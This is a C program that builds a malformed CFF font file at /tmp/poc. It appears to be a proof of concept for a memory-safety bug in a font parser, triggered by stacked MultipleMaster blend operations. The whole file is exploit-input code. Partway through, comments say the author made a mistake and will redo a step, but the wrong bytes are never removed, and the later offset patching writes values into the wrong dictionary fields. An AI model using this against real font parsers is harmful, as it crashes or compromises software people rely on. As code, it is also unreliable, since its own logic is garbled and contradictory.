#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* CFF header */
    fputc(0x01, f); fputc(0x00, f); fputc(0x04, f); fputc(0x01, f);

    /* Name INDEX (1 name "A") */
    fputc(0x00, f); fputc(0x01, f); /* count = 1 */
    fputc(0x01, f);                 /* offSize = 1 */
    fputc(0x01, f);                 /* offset[0] = 1 */
    fputc(0x02, f);                 /* offset[1] = 2 */
    fputc(0x41, f);                 /* "A" */

    /* Top DICT INDEX */
    fputc(0x00, f); fputc(0x01, f); /* count = 1 */
    fputc(0x01, f);                 /* offSize = 1 */
    fputc(0x01, f);                 /* offset[0] = 1 */

    long dict_data = ftell(f);

    /* MultipleMaster: num_axes=1, num_designs=2 */
    fputc(0x8C, f); /* num_axes = 1 */
    fputc(0x8D, f); /* num_designs = 2 */
    fputc(12, f);   fputc(22, f);   /* opcode */

    /* charset (placeholder) */
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(15, f);                   /* charset */

    /* Private (placeholders) */
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f); /* size */
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f); /* offset */
    fputc(18, f);                   /* Private */

    long dict_end = ftell(f);
    long dict_size = dict_end - dict_data;
    fputc(1 + dict_size, f); /* offset[1] */

    /* Empty String INDEX */
    fputc(0x00, f); fputc(0x00, f);

    /* Empty Global Subr INDEX */
    fputc(0x00, f); fputc(0x00, f);

    /* Private DICT */
    long private_offset = ftell(f);

    /* vsindex */
    fputc(0x8B, f); /* push 0 */
    fputc(15, f);   /* vsindex */

    /* First blend: numBlends=20, base=0, 80 values (20*2*2) */
    fputc(0x9F, f); /* push 20 (20+139=159=0x9F) */
    fputc(0x8B, f); /* push 0 */
    for (int i = 0; i < 80; i++) fputc(0x8B, f); /* zeros */
    fputc(37, f);   /* blend */

    /* Second blend: numBlends=20, base=20, 80 values */
    fputc(0x9F, f); /* push 20 */
    fputc(0x9F, f); /* push 20 */
    for (int i = 0; i < 80; i++) fputc(0x8B, f); /* zeros */
    fputc(37, f);   /* blend */

    /* Third blend: numBlends=20, base=40, 80 values */
    fputc(0x9F, f); /* push 20 */
    fputc(0x9F, f); fputc(0x8B, f); fputc(0x8B, f); /* push 40 (2-byte encoding) */
    /* Actually push 40 using 0x1C 0x00 0x28 */
    /* Let me fix: push 40 = 0x1C 0x00 0x28 */
    /* Wait, we already wrote 3 bytes. Let me redo this more carefully. */

    /* I need to redo the third blend properly */
    /* Seek back to after second blend */
    long after_second = ftell(f);
    /* We'll just write third blend correctly now */
    fputc(0x9F, f); /* push 20 */
    fputc(0x1C, f); fputc(0x00, f); fputc(0x28, f); /* push 40 */
    for (int i = 0; i < 80; i++) fputc(0x8B, f); /* zeros */
    fputc(37, f);   /* blend */

    long private_end = ftell(f);
    long private_size = private_end - private_offset;

    /* CharStrings INDEX (1 glyph: endchar) */
    long charstrings_offset = ftell(f);
    fputc(0x00, f); fputc(0x01, f); /* count = 1 */
    fputc(0x01, f);                 /* offSize = 1 */
    fputc(0x01, f);                 /* offset[0] = 1 */
    fputc(0x02, f);                 /* offset[1] = 2 */
    fputc(14, f);                   /* endchar */

    /* Patch Top DICT offsets */
    fseek(f, dict_data + 4, SEEK_SET);
    fputc(0x1C, f);
    fputc((charstrings_offset >> 8) & 0xFF, f);
    fputc(charstrings_offset & 0xFF, f);

    fseek(f, dict_data + 8, SEEK_SET);
    fputc(0x1C, f);
    fputc((private_size >> 8) & 0xFF, f);
    fputc(private_size & 0xFF, f);

    fseek(f, dict_data + 11, SEEK_SET);
    fputc(0x1C, f);
    fputc((private_offset >> 8) & 0xFF, f);
    fputc(private_offset & 0xFF, f);

    fclose(f);
    return 0;
}